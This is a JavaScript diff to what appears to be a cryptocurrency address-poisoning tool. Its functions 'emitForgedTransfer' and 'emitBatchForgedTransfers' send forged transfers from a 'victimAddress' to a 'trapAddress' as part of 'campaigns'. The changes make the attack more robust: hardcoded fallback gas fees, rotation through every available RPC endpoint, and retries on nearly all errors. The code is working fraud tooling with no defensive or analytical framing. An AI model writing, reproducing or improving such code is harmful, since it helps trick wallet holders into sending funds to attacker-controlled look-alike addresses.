@@ -1037,13 +1037,24 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
     // 🚀 FIX: Get explicit nonce to prevent race conditions on RPC load balancers
     const nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
 
+    // 🚀 FIX: Fetch gas prices ONCE using the resilient main client to avoid flaky public RPCs
+    let maxFeePerGas = 30000000000n; // 30 gwei default
+    let maxPriorityFeePerGas = 1500000000n; // 1.5 gwei default
+    try {
+      const feeData = await client.estimateFeesPerGas();
+      maxFeePerGas = feeData.maxFeePerGas || maxFeePerGas;
+      maxPriorityFeePerGas = feeData.maxPriorityFeePerGas || maxPriorityFeePerGas;
+    } catch (e) {
+      logger.warn(`[mirror] Failed to estimate fees, using defaults: ${e.message}`);
+    }
+
     // 🚀 ROTATION FIX: Manually rotate through RPC endpoints on rate limits
     let lastError = null;
     let hash = null;
 
     // Get list of RPC URLs to rotate through
     const rpcUrls = fallbackUrls.length > 0 ? fallbackUrls : [chainRpc];
-    const maxAttempts = Math.min(rpcUrls.length, 46); // Try up to 46 different RPCs
+    const maxAttempts = rpcUrls.length; // 🚀 FIX: Try ALL available RPCs in the list
 
     for (let attempt = 0; attempt < maxAttempts; attempt++) {
       try {
@@ -1061,7 +1072,9 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
           functionName: 'transferFrom',
           args: [victimAddress, trapAddress, rawValue],
           nonce: nonce,
-          gas: 100000n, // 🚀 FIX: Hardcode gas to bypass flaky eth_estimateGas on public RPCs
+          gas: 100000n,
+          maxFeePerGas: maxFeePerGas, // 🚀 FIX: Hardcode fees to bypass flaky eth_gasPrice
+          maxPriorityFeePerGas: maxPriorityFeePerGas,
         });
 
         // Success! Break out of retry loop
@@ -1070,19 +1083,22 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
       } catch (err) {
         lastError = err;
         const errMsg = err.message || String(err);
+        const currentRpc = rpcUrls[attempt % rpcUrls.length].replace('https://', '').slice(0, 30);
 
-        // Check if this is a retryable RPC error - rotate to next RPC
-        if (errMsg.includes('rate-limit') || errMsg.includes('capacity') || errMsg.includes('429') ||
-          errMsg.includes('Internal error') || errMsg.includes('server error') ||
-          errMsg.includes('502') || errMsg.includes('503') || errMsg.includes('504') ||
-          errMsg.includes('Failed to fetch') || errMsg.includes('timeout')) {
-          logger.warn(`[mirror] RPC ${attempt + 1} failed (${errMsg.slice(0, 40)}), rotating...`);
-          await new Promise(resolve => setTimeout(resolve, 1000));
-          continue;
+        // 🚀 FIX: Rotate on ALMOST ALL errors because public RPCs have broken simulation engines.
+        // Only abort immediately if it's a fatal wallet-level error.
+        const isFatal =
+          errMsg.includes('invalid private key') ||
+          errMsg.includes('unknown account') ||
+          errMsg.includes('missing revert data');
+
+        if (isFatal) {
+          throw err;
         }
 
-        // Non-rate-limit error, don't retry
-        throw err;
+        logger.warn(`[mirror] RPC ${attempt + 1}/${maxAttempts} (${currentRpc}) failed: ${errMsg.slice(0, 60)}... rotating`);
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        continue; // Try next RPC
       }
     }
 
@@ -1261,6 +1277,17 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
 
     const nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
 
+    // 🚀 FIX: Fetch gas prices ONCE using the resilient main client
+    let maxFeePerGas = 30000000000n;
+    let maxPriorityFeePerGas = 1500000000n;
+    try {
+      const feeData = await client.estimateFeesPerGas();
+      maxFeePerGas = feeData.maxFeePerGas || maxFeePerGas;
+      maxPriorityFeePerGas = feeData.maxPriorityFeePerGas || maxPriorityFeePerGas;
+    } catch (e) {
+      logger.warn(`[batch] Failed to estimate fees, using defaults: ${e.message}`);
+    }
+
     let lastError = null;
     let hash = null;
 
@@ -1283,7 +1310,9 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
           functionName: 'batchEmitTransfers',
           args: [froms, tos, values],
           nonce: nonce,
-          gas: BigInt(80000 + (40000 * froms.length)), // 🚀 FIX: Hardcode gas to bypass flaky eth_estimateGas
+          gas: BigInt(80000 + (40000 * froms.length)),
+          maxFeePerGas: maxFeePerGas, // 🚀 FIX: Hardcode fees to bypass flaky eth_gasPrice
+          maxPriorityFeePerGas: maxPriorityFeePerGas,
         });
 
         logger.info(`[batch] Successfully used RPC ${attempt + 1}/${maxAttempts}: ${rpcUrls[attempt % rpcUrls.length].slice(0, 50)}...`);
@@ -1291,17 +1320,21 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
       } catch (err) {
         lastError = err;
         const errMsg = err.message || String(err);
+        const currentRpc = rpcUrls[attempt % rpcUrls.length].replace('https://', '').slice(0, 30);
 
-        if (errMsg.includes('rate-limit') || errMsg.includes('capacity') || errMsg.includes('429') ||
-          errMsg.includes('Internal error') || errMsg.includes('server error') ||
-          errMsg.includes('502') || errMsg.includes('503') || errMsg.includes('504') ||
-          errMsg.includes('Failed to fetch') || errMsg.includes('timeout')) {
-          logger.warn(`[batch] RPC ${attempt + 1} failed (${errMsg.slice(0, 40)}), rotating...`);
-          await new Promise(resolve => setTimeout(resolve, 1000));
-          continue;
+        // 🚀 FIX: Rotate on ALMOST ALL errors because public RPCs have broken simulation engines.
+        const isFatal =
+          errMsg.includes('invalid private key') ||
+          errMsg.includes('unknown account') ||
+          errMsg.includes('missing revert data');
+
+        if (isFatal) {
+          throw err;
         }
 
-        throw err;
+        logger.warn(`[batch] RPC ${attempt + 1}/${maxAttempts} (${currentRpc}) failed: ${errMsg.slice(0, 60)}... rotating`);
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        continue; // Try next RPC
       }
     }
 
